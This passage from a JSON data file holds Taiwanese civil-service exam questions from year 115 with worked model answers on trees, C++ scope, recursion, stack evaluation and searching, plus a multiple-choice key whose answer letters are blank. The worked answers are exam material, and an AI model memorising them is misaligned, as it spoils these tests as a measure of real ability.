    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">四</span>\r\n            <div>\r\n              <h2>Binary Search Tree 與 Red Black Tree</h2>\r\n              <p>配分 30 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              從空集合開始，依數字串 1, 2, 3, 4, 5, 6, 7, 8 順序插入節點，建立並繪出 Binary Search Tree 與 Red Black Tree。再分別說明兩者在插入、刪除與搜尋數字等三操作的時間複雜度。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>Binary Search Tree</h3>\r\n            <p>\r\n              依 1 到 8 遞增插入一般 BST，每個新節點都會成為前一節點的右子節點，因此形成向右傾斜的鏈狀樹。\r\n            </p>\r\n            <pre class=\"tree-pre\"><code>1\r\n \\\r\n  2\r\n   \\\r\n    3\r\n     \\\r\n      4\r\n       \\\r\n        5\r\n         \\\r\n          6\r\n           \\\r\n            7\r\n             \\\r\n              8</code></pre>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>Red Black Tree</h3>\r\n            <p>\r\n              依序插入 1 到 8 並依紅黑樹規則調整後，可得到下列其中一種合法結果。單線圓代表黑色節點，雙線圓代表紅色節點。\r\n            </p>\r\n            <div class=\"rbt-diagram\" aria-label=\"Red Black Tree 插入 1 到 8 後的示意\">\r\n              <div class=\"rbt-level\">\r\n                <span class=\"rb-node black\">4</span>\r\n              </div>\r\n              <div class=\"rbt-level\">\r\n                <span class=\"rb-node red\">2</span>\r\n                <span class=\"rb-node red\">6</span>\r\n              </div>\r\n              <div class=\"rbt-level\">\r\n                <span class=\"rb-node black\">1</span>\r\n                <span class=\"rb-node black\">3</span>\r\n                <span class=\"rb-node black\">5</span>\r\n                <span class=\"rb-node black\">7</span>\r\n              </div>\r\n              <div class=\"rbt-level rbt-tail\">\r\n                <span></span><span></span><span></span><span></span><span></span><span></span><span></span>\r\n                <span class=\"rb-node red\">8</span>\r\n              </div>\r\n            </div>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>操作時間複雜度</h3>\r\n            <div class=\"table-wrap\">\r\n              <table>\r\n                <thead>\r\n                  <tr>\r\n                    <th>資料結構</th>\r\n                    <th>搜尋</th>\r\n                    <th>插入</th>\r\n                    <th>刪除</th>\r\n                  </tr>\r\n                </thead>\r\n                <tbody>\r\n                  <tr>\r\n                    <td>一般 Binary Search Tree</td>\r\n                    <td>平均 O(log n)，最壞 O(n)</td>\r\n                    <td>平均 O(log n)，最壞 O(n)</td>\r\n                    <td>平均 O(log n)，最壞 O(n)</td>\r\n                  </tr>\r\n                  <tr>\r\n                    <td>Red Black Tree</td>\r\n                    <td>O(log n)</td>\r\n                    <td>O(log n)</td>\r\n                    <td>O(log n)</td>\r\n                  </tr>\r\n                </tbody>\r\n              </table>\r\n            </div>\r\n            <p>\r\n              原因是一般 BST 若輸入資料已排序，樹高可能退化為 n；Red Black Tree 透過顏色規則與旋轉維持近似平衡，使樹高保持在 O(log n)。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 13,
    "slug": "question-13",
    "title": "C++ 變數作用域、傳值與傳參考",
    "points": "30 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "四等",
    "category": "資訊處理（選試英文）",
    "subject": "程式設計概要",
    "subjectSlug": "115-customs-fourth-programming",
    "order": "一",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">一</span>\r\n            <div>\r\n              <h2>C++ 變數作用域、傳值與傳參考</h2>\r\n              <p>配分 30 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              請追蹤下列 C++ 程式，列出輸出結果，並說明每項輸出對應數值的原因。\r\n            </p>\r\n            <pre class=\"prompt-pre\"><code>#include &lt;iostream&gt;\r\nint a = 10;\r\nvoid testA(int a) {\r\n  cout &lt;&lt; \"1. a = \" &lt;&lt; a &lt;&lt; endl;\r\n  a++;\r\n  cout &lt;&lt; \"2. a = \" &lt;&lt; a &lt;&lt; endl;\r\n}\r\nvoid testB(void) {\r\n  cout &lt;&lt; \"3. a = \" &lt;&lt; a &lt;&lt; endl;\r\n  a++;\r\n  cout &lt;&lt; \"4. a = \" &lt;&lt; a &lt;&lt; endl;\r\n}\r\nvoid testC(int &amp;a) {\r\n  cout &lt;&lt; \"5. a = \" &lt;&lt; a &lt;&lt; endl;\r\n  a++;\r\n  cout &lt;&lt; \"6. a = \" &lt;&lt; a &lt;&lt; endl;\r\n}\r\nint main() {\r\n  int a = 100;\r\n  cout &lt;&lt; \"7. a = \" &lt;&lt; a &lt;&lt; endl;\r\n  a++;\r\n  testC(a);\r\n  cout &lt;&lt; \"8. a = \" &lt;&lt; a &lt;&lt; endl;\r\n  a++;\r\n  testB();\r\n  cout &lt;&lt; \"9. a = \" &lt;&lt; a &lt;&lt; endl;\r\n  a++;\r\n  testA(a);\r\n  cout &lt;&lt; \"10. a = \" &lt;&lt; a &lt;&lt; endl;\r\n  return 0;\r\n}</code></pre>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>輸出結果</h3>\r\n            <pre><code>7. a = 100\r\n5. a = 101\r\n6. a = 102\r\n8. a = 102\r\n3. a = 10\r\n4. a = 11\r\n9. a = 103\r\n1. a = 104\r\n2. a = 105\r\n10. a = 104</code></pre>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>原因說明</h3>\r\n            <p>\r\n              全域變數 <code>a</code> 初值為 10；<code>main</code> 內又宣告區域變數 <code>a = 100</code>，在 <code>main</code> 中會優先使用此區域變數。\r\n            </p>\r\n            <p>\r\n              <code>main</code> 先輸出 100，接著 <code>a++</code> 變成 101。呼叫 <code>testC(a)</code> 時使用參考傳遞，因此函式內的 <code>a++</code> 會直接改到 <code>main</code> 的區域變數，所以依序輸出 101、102，回到 <code>main</code> 後第 8 行仍為 102。\r\n            </p>\r\n            <p>\r\n              接著 <code>main</code> 的 <code>a++</code> 變成 103。呼叫 <code>testB()</code> 時，函式內沒有區域參數 <code>a</code>，所以使用全域變數，輸出 10 後把全域變數改成 11，再輸出 11；這不影響 <code>main</code> 的區域變數。之後第 9 行輸出 103，再遞增為 104。<code>testA(a)</code> 是傳值呼叫，參數得到副本 104，函式內輸出 104、105，但不會改變 <code>main</code> 的 <code>a</code>，所以最後第 10 行輸出 104。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 14,
    "slug": "question-14",
    "title": "兩矩形是否重疊的判斷邏輯",
    "points": "20 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "四等",
    "category": "資訊處理（選試英文）",
    "subject": "程式設計概要",
    "subjectSlug": "115-customs-fourth-programming",
    "order": "二",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">二</span>\r\n            <div>\r\n              <h2>兩矩形是否重疊的判斷邏輯</h2>\r\n              <p>配分 20 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              給定方形 A 的左上角座標 <code>(x1, y1)</code>、寬高 <code>(w1, h1)</code>，以及方形 B 的左上角座標 <code>(x2, y2)</code>、寬高 <code>(w2, h2)</code>，請設計判斷邏輯確認兩方形是否有重疊，有重疊回傳 true，否則回傳 false。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>判斷想法</h3>\r\n            <p>\r\n              以常見螢幕座標為例，左上角為起點，x 往右增加，y 往下增加。兩矩形不重疊只有四種情況：A 完全在 B 左邊、A 完全在 B 右邊、A 完全在 B 上方、A 完全在 B 下方。只要不是這四種情況，就代表有面積重疊。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>虛擬碼</h3>\r\n            <pre><code>boolean overlap(x1, y1, w1, h1, x2, y2, w2, h2):\r\n  if x1 + w1 &lt;= x2:\r\n    return false\r\n  if x2 + w2 &lt;= x1:\r\n    return false\r\n  if y1 + h1 &lt;= y2:\r\n    return false\r\n  if y2 + h2 &lt;= y1:\r\n    return false\r\n  return true</code></pre>\r\n            <p>\r\n              這裡使用 <code>&lt;=</code> 表示若兩矩形只是邊界相接，沒有共同面積，則視為不重疊。若題目把「碰到邊」也算重疊，可將 <code>&lt;=</code> 改為 <code>&lt;</code>。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 15,
    "slug": "question-15",
    "title": "Pascal 遞迴呼叫、記憶化與分支圖",
    "points": "25 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "四等",
    "category": "資訊處理（選試英文）",
    "subject": "程式設計概要",
    "subjectSlug": "115-customs-fourth-programming",
    "order": "三",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">三</span>\r\n            <div>\r\n              <h2>Pascal 遞迴呼叫、記憶化與分支圖</h2>\r\n              <p>配分 25 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              以圖示法表示遞迴程式呼叫執行過程，給定 <code>n = 4</code>、<code>k = 2</code> 呼叫 <code>pascal(4,2)</code>，求最後回傳結果，並依產生的堆疊與分支圖呈現呼叫過程。\r\n            </p>\r\n            <pre class=\"prompt-pre\"><code>R = {}\r\ndef pascal(n, k):\r\n  if k == 0 or k == n:\r\n    return 1\r\n  if (n, k) in R:\r\n    return R[(n, k)]\r\n  R[(n, k)] = pascal(n-1, k-1) + pascal(n-1, k)\r\n  return R[(n, k)]</code></pre>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>分支圖與回傳值</h3>\r\n            <pre><code>pascal(4,2)\r\n├─ pascal(3,1)\r\n│  ├─ pascal(2,0) = 1\r\n│  └─ pascal(2,1)\r\n│     ├─ pascal(1,0) = 1\r\n│     └─ pascal(1,1) = 1\r\n│     ⇒ R[(2,1)] = 2\r\n│  ⇒ R[(3,1)] = 1 + 2 = 3\r\n└─ pascal(3,2)\r\n   ├─ pascal(2,1) = 2  (由 R 直接取出)\r\n   └─ pascal(2,2) = 1\r\n   ⇒ R[(3,2)] = 2 + 1 = 3\r\n\r\nR[(4,2)] = 3 + 3 = 6</code></pre>\r\n            <p>\r\n              因此最後回傳值為 <strong>6</strong>。其中 <code>pascal(2,1)</code> 第一次計算後被存入 <code>R</code>，第二次遇到相同參數時直接取出，可避免重複展開遞迴。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 16,
    "slug": "question-16",
    "title": "以隱私保護方式比較財富",
    "points": "25 分",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "四等",
    "category": "資訊處理（選試英文）",
    "subject": "程式設計概要",
    "subjectSlug": "115-customs-fourth-programming",
    "order": "四",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">四</span>\r\n            <div>\r\n              <h2>以隱私保護方式比較財富</h2>\r\n              <p>配分 25 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              張三和李四要比較誰較有錢，但不直接說出財富金額。假設一個陣列序號代表一個財富單位，擁有該單位則標記為 T。張三擁有 4 千萬，標記 1 到 4 為 T；李四擁有 6 千萬，標記 1 到 6 為 T。請設計虛擬碼，讓兩人運用此程式驗證誰較有錢。\r\n            </p>\r\n            <div class=\"table-wrap\">\r\n              <table>\r\n                <thead>\r\n                  <tr><th></th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th></tr>\r\n                </thead>\r\n                <tbody>\r\n                  <tr><th>張三</th><td>T</td><td>T</td><td>T</td><td>T</td><td>-</td><td>-</td><td>-</td></tr>\r\n                  <tr><th>李四</th><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>T</td><td>-</td></tr>\r\n                </tbody>\r\n              </table>\r\n            </div>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>比較原理</h3>\r\n            <p>\r\n              若 A 有 a 個單位，A 只需查看 B 的第 a 個格子：若是 T，表示 B 至少有 a 個單位；若不是 T，表示 B 少於 a 個單位。同理，B 只需查看 A 的第 b 個格子。雙方不需要公開完整金額，只需要公開必要的檢查結果。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>虛擬碼</h3>\r\n            <pre><code>function comparePrivate(A_name, A_array, a, B_name, B_array, b):\r\n  A_sees_B = B_array[a]\r\n  B_sees_A = A_array[b]\r\n\r\n  if A_sees_B == 'T' and B_sees_A != 'T':\r\n    return B_name + \" 較有錢\"\r\n\r\n  if A_sees_B != 'T' and B_sees_A == 'T':\r\n    return A_name + \" 較有錢\"\r\n\r\n  if A_sees_B == 'T' and B_sees_A == 'T':\r\n    return \"兩者財富相同\"\r\n\r\n  return \"輸入資料不一致，需重新檢查\"</code></pre>\r\n            <p>\r\n              代入題目資料時，張三查看李四第 4 格，結果為 T，表示李四至少有 4 千萬；李四查看張三第 6 格，結果為 -，表示張三不到 6 千萬。因此可判定 <strong>李四較有錢</strong>。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 17,
    "slug": "question-17",
    "title": "四等計算機概要選擇題答案整理",
    "points": "",
    "year": "115年",
    "examName": "關務人員考試",
    "grade": "四等",
    "category": "資訊處理（選試英文）",
    "subject": "計算機概要",
    "subjectSlug": "115-customs-fourth-computer-overview",
    "order": "一",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">選</span>\r\n            <div>\r\n              <h2>四等計算機概要選擇題答案整理</h2>\r\n              <p>40 題，每題 2.5 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目來源</h3>\r\n            <p>\r\n              115 年公務人員特種考試關務人員四等考試，類科為資訊處理（選試英文），科目為計算機概要，代號 5145。本科目為單一選擇題，共 40 題。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>答案速查</h3>\r\n            <div class=\"table-wrap\">\r\n              <table>\r\n                <thead>\r\n                  <tr>\r\n                    <th>題號</th>\r\n                    <th>答案</th>\r\n                    <th>重點說明</th>\r\n                  </tr>\r\n                </thead>\r\n                <tbody>\r\n                  <tr><td>1</td><td></td><td>25 ms × 600 MHz = 15 × 10^6 clock cycles。</td></tr>\r\n                  <tr><td>2</td><td></td><td>分散式系統透過網路交換資料，不必使用特製高速交換網路支援所有傳輸。</td></tr>\r\n                  <tr><td>3</td><td></td><td>等待記憶體資料會造成 pipeline stall。</td></tr>\r\n                  <tr><td>4</td><td></td><td>運算結果為 0 時，Zero Flag 會設為 1。</td></tr>\r\n                  <tr><td>5</td><td></td><td>RAID 5 採區塊交錯分散同位位元。</td></tr>\r\n                  <tr><td>6</td><td></td><td>多顆硬碟容錯讀取是 RAID 的概念。</td></tr>\r\n                  <tr><td>7</td><td></td><td>20 條位址線可定址 2^20 Bytes；Data Bus 通常為雙向。</td></tr>\r\n                  <tr><td>8</td><td></td><td>8 位元二補數範圍為 -128 到 127；(131)_8 + (42)_8 = 123。</td></tr>\r\n                  <tr><td>9</td><td></td><td>容量由小到大為 KB、MB、GB、TB、PB。</td></tr>\r\n                  <tr><td>10</td><td></td><td>A2.C(hex) = 162 + 12/16 = 162.75。</td></tr>\r\n                  <tr><td>11</td><td></td><td>X=1、Y=0 時，(X' + Y) · Y' = 0。</td></tr>\r\n                  <tr><td>12</td><td></td><td>57.32000 + 0.0185000 = 57.33850 = 0.5733850 × 10^2。</td></tr>\r\n                  <tr><td>13</td><td></td><td>最大化指數與尾數高位，可得 2^128 - 2^124。</td></tr>\r\n                  <tr><td>14</td><td></td><td>上方 OR 輸出為 1，下方 OR 輸出為 B'，AND 後為 B'。</td></tr>\r\n                  <tr><td>15</td><td></td><td>x=1、y=1 時，x AND y 的結果為 1。</td></tr>\r\n                  <tr><td>16</td><td></td><td>真值表是有限列舉，不具無限動作或推論表達能力。</td></tr>\r\n                  <tr><td>17</td><td></td><td>switch 無 break，month=1、2、4 會 fall through 輸出。</td></tr>\r\n                  <tr><td>18</td><td></td><td>Python list 可變且不可雜湊，不能作為 dictionary key。</td></tr>\r\n                  <tr><td>19</td><td>疑義</td><td>依 PDF 縮排執行，最後 sum 為 21，但選項未列 21，題目或選項可能有誤。</td></tr>\r\n                  <tr><td>20</td><td></td><td>作業系統核心 kernel 會常駐執行。</td></tr>\r\n                  <tr><td>21</td><td></td><td>swap-in 與 swap-out 屬於記憶體管理。</td></tr>\r\n                  <tr><td>22</td><td></td><td>Garbage collection 用來回收不再使用的記憶體，避免 memory leak。</td></tr>\r\n                  <tr><td>23</td><td></td><td>分時系統以時間片讓多位使用者共用 CPU。</td></tr>\r\n                  <tr><td>24</td><td></td><td>固定一種分頁尺寸不會增加 TLB reach。</td></tr>\r\n                  <tr><td>25</td><td></td><td>800 MHz / CPI 4 = 200 MIPS。</td></tr>\r\n                  <tr><td>26</td><td></td><td>動態區塊分配容易產生外部碎片。</td></tr>\r\n                  <tr><td>27</td><td></td><td>I/O-bound 程序多在等待 I/O，通常不長時間占用 CPU ready queue。</td></tr>\r\n                  <tr><td>28</td><td></td><td>網頁樣式由 CSS 指定。</td></tr>\r\n                  <tr><td>29</td><td></td><td>選項中最接近分頁優點者為減少碎片問題；分頁主要可避免外部碎片。</td></tr>\r\n                  <tr><td>30</td><td></td><td>Adaptive Bitrate Streaming 可依頻寬調整播放品質。</td></tr>\r\n                  <tr><td>31</td><td></td><td>高通濾波保留高頻，均勻背景接近低頻，輸出趨近黑色。</td></tr>\r\n                  <tr><td>32</td><td></td><td>2048 × 1536 × 32 bits = 12 MB。</td></tr>\r\n                  <tr><td>33</td><td></td><td>影像平滑化可減弱高頻分量。</td></tr>\r\n                  <tr><td>34</td><td></td><td>瀏覽器不能保證自動播放所有格式影片。</td></tr>\r\n                  <tr><td>35</td><td></td><td>CPU 核心少但強，GPU 核心多且適合大量平行處理。</td></tr>\r\n                  <tr><td>36</td><td></td><td>WAV 是音訊格式，不是失真壓縮的視訊編碼格式。</td></tr>\r\n                  <tr><td>37</td><td></td><td>智慧卡讀卡機屬於輸入裝置，因此該敘述錯誤。</td></tr>\r\n                  <tr><td>38</td><td></td><td>5.1 聲道中的 .1 是重低音喇叭。</td></tr>\r\n                  <tr><td>39</td><td></td><td>串流應用最相關的是壓縮後更順暢地傳輸影片。</td></tr>\r\n                  <tr><td>40</td><td></td><td>字元集大小為 X 時，固定長度編碼至少需 ceiling(log2 X) 位元。</td></tr>\r\n                </tbody>\r\n              </table>\r\n            </div>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>第 19 題補充</h3>\r\n            <p>\r\n              依 PDF 畫面中的 Python 縮排，只有 <code>counter</code> 為 3、6、9 時會進入 <code>if</code> 區塊，分別讓 <code>sum</code> 增加 <code>counter + 1</code>，所以總和為 <code>4 + 7 + 10 = 21</code>。由於選項為 0、18、22、25，沒有 21，因此整理時標為疑義題。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 18,
    "slug": "question-18",
    "title": "演算法的有限性與五項特性",
    "points": "25 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料結構",
    "subjectSlug": "115-disability-third-data-structures",
    "order": "一",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">一</span>\r\n            <div>\r\n              <h2>演算法的有限性與五項特性</h2>\r\n              <p>配分 25 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              請回答下列兩個演算法相關問題：程式設計師撰寫的程式是否必須滿足演算法應具備「有限性」（Finiteness）的特性？請詳細說明理由。演算法必須滿足五項特性，除「有限性」外，請寫出另外四項特性，並說明各項特性的意義。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>程式是否必須具備有限性</h3>\r\n            <p>\r\n              不一定。演算法的有限性是指對每一組合法輸入，演算法必須在有限步驟後停止並產生結果；但程式是演算法的實作形式之一，程式的目的不一定都是「算完就結束」。例如作業系統、伺服器、監控程式、事件迴圈與互動式應用程式，通常設計成持續執行，等待使用者輸入或外部事件，因此整個程式本身未必具有有限性。\r\n            </p>\r\n            <p>\r\n              若某段程式是在實作一個特定演算法，例如排序、搜尋、最短路徑或數值計算，則該段程式對合法輸入應能在有限時間內結束，才符合演算法的要求。因此應區分「程式整體」與「程式中實作演算法的部分」：程式不必全部都會自然終止，但演算法本身必須滿足有限性。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>除有限性外的四項特性</h3>\r\n            <div class=\"table-wrap\">\r\n              <table>\r\n                <thead>\r\n                  <tr>\r\n                    <th>特性</th>\r\n                    <th>意義</th>\r\n                  </tr>\r\n                </thead>\r\n                <tbody>\r\n                  <tr>\r\n                    <td>輸入（Input）</td>\r\n                    <td>演算法可有零個或多個輸入，輸入是演算法處理問題所需的初始資料。</td>\r\n                  </tr>\r\n                  <tr>\r\n                    <td>輸出（Output）</td>\r\n                    <td>演算法至少要產生一個輸出，作為問題的答案或處理後的結果。</td>\r\n                  </tr>\r\n                  <tr>\r\n                    <td>明確性（Definiteness）</td>\r\n                    <td>每一個步驟都必須清楚、無歧義，執行者能明確知道下一步要做什麼。</td>\r\n                  </tr>\r\n                  <tr>\r\n                    <td>有效性（Effectiveness）</td>\r\n                    <td>每一個操作都必須基本且可實際執行，能在有限時間內完成，不可只是抽象或不可操作的描述。</td>\r\n                  </tr>\r\n                </tbody>\r\n              </table>\r\n            </div>\r\n          </section>"
  },
  {
    "id": 19,
    "slug": "question-19",
    "title": "虛擬碼 For 迴圈追蹤",
    "points": "25 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料結構",
    "subjectSlug": "115-disability-third-data-structures",
    "order": "二",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">二</span>\r\n            <div>\r\n              <h2>虛擬碼 For 迴圈追蹤</h2>\r\n              <p>配分 25 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              請根據下列虛擬碼程式段，回答程式段執行完後 <code>s</code> 的值、<code>i</code> 的值、<code>For i from 1 to 150 step 7 do</code> 共執行多少次，以及 <code>s ← s + i</code> 共執行多少次，所有答案均須說明原因或提供計算過程。\r\n            </p>\r\n            <pre class=\"prompt-pre\"><code>Procedure X\r\ns ← 0\r\nFor i from 1 to 150 step 7 do\r\n  s ← s + i\r\nEnd For\r\nPrint s\r\nEnd X</code></pre>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>迴圈值與次數</h3>\r\n            <p>\r\n              <code>i</code> 從 1 開始，每次增加 7，只要 <code>i ≤ 150</code> 就執行。因此實際加到 <code>s</code> 的數列為：\r\n            </p>\r\n            <pre><code>1, 8, 15, ..., 148</code></pre>\r\n            <p>\r\n              令第 <code>k</code> 次增加後的值為 <code>1 + 7k</code>，需滿足 <code>1 + 7k ≤ 150</code>，得到 <code>k ≤ 149 / 7 = 21.28...</code>，所以 <code>k = 0</code> 到 <code>21</code>，共 <strong>22 次</strong>。最後一次進入迴圈時 <code>i = 148</code>，再加 7 後變成 <code>155</code>，因 <code>155 &gt; 150</code> 而停止；若依此類虛擬碼保留迴圈控制變數的慣例，執行完後 <code>i = 155</code>。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>s 的計算</h3>\r\n            <p>\r\n              <code>s</code> 是等差級數總和，首項 1，末項 148，項數 22：\r\n            </p>\r\n            <pre><code>s = 22 × (1 + 148) / 2\r\n  = 11 × 149\r\n  = 1639</code></pre>\r\n            <p>\r\n              因此程式段執行完後 <strong><code>s = 1639</code></strong>。<code>For i from 1 to 150 step 7 do</code> 的迴圈主體共執行 <strong>22 次</strong>，而 <code>s ← s + i</code> 在每次進入迴圈時執行一次，所以也共執行 <strong>22 次</strong>。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 20,
    "slug": "question-20",
    "title": "利用堆疊計算運算式",
    "points": "25 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料結構",
    "subjectSlug": "115-disability-third-data-structures",
    "order": "三",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">三</span>\r\n            <div>\r\n              <h2>利用堆疊計算運算式</h2>\r\n              <p>配分 25 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              若下列前置式利用堆疊做計算，假設每個運算元都是一個阿拉伯數字，請寫出完整的計算過程與最終計算結果。\r\n            </p>\r\n            <pre class=\"prompt-pre\"><code>1 2 * 3 4 5 / 6 3 - + - +</code></pre>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>判讀說明</h3>\r\n            <p>\r\n              題目文字稱為前置式（prefix），但給出的符號序列是「運算元在前、運算子在後」，實際上符合後置式（postfix, Reverse Polish Notation）的格式。因此以下依後置式堆疊規則計算：遇到運算元就 push，遇到運算子就 pop 出右運算元與左運算元，計算後再 push 回堆疊。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>堆疊計算過程</h3>\r\n            <div class=\"table-wrap\">\r\n              <table>\r\n                <thead>\r\n                  <tr>\r\n                    <th>讀入</th>\r\n                    <th>動作</th>\r\n                    <th>堆疊狀態</th>\r\n                  </tr>\r\n                </thead>\r\n                <tbody>\r\n                  <tr><td>1</td><td>push 1</td><td>[1]</td></tr>\r\n                  <tr><td>2</td><td>push 2</td><td>[1, 2]</td></tr>\r\n                  <tr><td>*</td><td>1 * 2 = 2</td><td>[2]</td></tr>\r\n                  <tr><td>3</td><td>push 3</td><td>[2, 3]</td></tr>\r\n                  <tr><td>4</td><td>push 4</td><td>[2, 3, 4]</td></tr>\r\n                  <tr><td>5</td><td>push 5</td><td>[2, 3, 4, 5]</td></tr>\r\n                  <tr><td>/</td><td>4 / 5 = 0.8</td><td>[2, 3, 0.8]</td></tr>\r\n                  <tr><td>6</td><td>push 6</td><td>[2, 3, 0.8, 6]</td></tr>\r\n                  <tr><td>3</td><td>push 3</td><td>[2, 3, 0.8, 6, 3]</td></tr>\r\n                  <tr><td>-</td><td>6 - 3 = 3</td><td>[2, 3, 0.8, 3]</td></tr>\r\n                  <tr><td>+</td><td>0.8 + 3 = 3.8</td><td>[2, 3, 3.8]</td></tr>\r\n                  <tr><td>-</td><td>3 - 3.8 = -0.8</td><td>[2, -0.8]</td></tr>\r\n                  <tr><td>+</td><td>2 + (-0.8) = 1.2</td><td>[1.2]</td></tr>\r\n                </tbody>\r\n              </table>\r\n            </div>\r\n            <p>\r\n              最終堆疊只剩一個值，因此計算結果為 <strong>1.2</strong>，也就是 <strong>6/5</strong>。\r\n            </p>\r\n          </section>"
  },
  {
    "id": 21,
    "slug": "question-21",
    "title": "循序搜尋法與二元搜尋法比較",
    "points": "25 分",
    "year": "115年",
    "examName": "身心障礙人員考試",
    "grade": "三等",
    "category": "資訊處理",
    "subject": "資料結構",
    "subjectSlug": "115-disability-third-data-structures",
    "order": "四",
    "html": "<div class=\"question-head\">\r\n            <span class=\"number\">四</span>\r\n            <div>\r\n              <h2>循序搜尋法與二元搜尋法比較</h2>\r\n              <p>配分 25 分</p>\r\n            </div>\r\n          </div>\r\n\r\n          <section class=\"prompt-block\">\r\n            <h3>題目</h3>\r\n            <p>\r\n              請詳述循序搜尋法（sequential search）與二元搜尋法（binary search）的運作原理並比較其優缺點。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>循序搜尋法</h3>\r\n            <p>\r\n              循序搜尋法又稱線性搜尋。它從資料集合的第一筆開始，依序將每一筆資料與目標值比較；若找到相同值就回傳位置或表示成功，若檢查到最後一筆仍未找到，則表示搜尋失敗。此方法不要求資料事先排序，也可用於陣列、串列或一般線性資料集合。\r\n            </p>\r\n            <p>\r\n              其優點是概念簡單、實作容易、適用範圍廣，資料未排序時也能直接使用。缺點是效率較低，最壞情況需要檢查全部 <code>n</code> 筆資料，時間複雜度為 <strong>O(n)</strong>，資料量很大時搜尋速度會明顯變慢。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>二元搜尋法</h3>\r\n            <p>\r\n              二元搜尋法必須用在已排序的資料上。每次先取搜尋範圍中間位置的資料與目標值比較：若相等則搜尋成功；若目標值較小，就只搜尋左半部；若目標值較大，就只搜尋右半部。每比較一次就能排除約一半資料，直到找到目標或搜尋範圍為空為止。\r\n            </p>\r\n            <p>\r\n              其優點是效率高，最壞情況時間複雜度為 <strong>O(log n)</strong>，適合大量且已排序的資料。缺點是資料必須先排序，若資料經常新增、刪除或排序成本很高，維持排序會增加額外負擔；此外二元搜尋通常較適合可隨機存取的陣列，若用在鏈結串列，尋找中間位置本身可能耗費較多時間。\r\n            </p>\r\n          </section>\r\n\r\n          <section class=\"answer-block\">\r\n            <h3>優缺點比較</h3>\r\n            <div class=\"table-wrap\">\r\n              <table>\r\n                <thead>\r\n                  <tr>\r\n                    <th>項目</th>\r\n                    <th>循序搜尋法</th>\r\n                    <th>二元搜尋法</th>\r\n                  </tr>\r\n                </thead>\r\n                <tbody>\r\n                  <tr>\r\n                    <td>資料條件</td>\r\n                    <td>不需排序</td>\r\n                    <td>必須已排序</td>\r\n                  </tr>\r\n                  <tr>\r\n                    <td>搜尋方式</td>\r\n                    <td>由前到後逐筆比較</td>\r\n                    <td>每次比較中間值並排除一半範圍</td>\r\n                  </tr>\r\n                  <tr>\r\n                    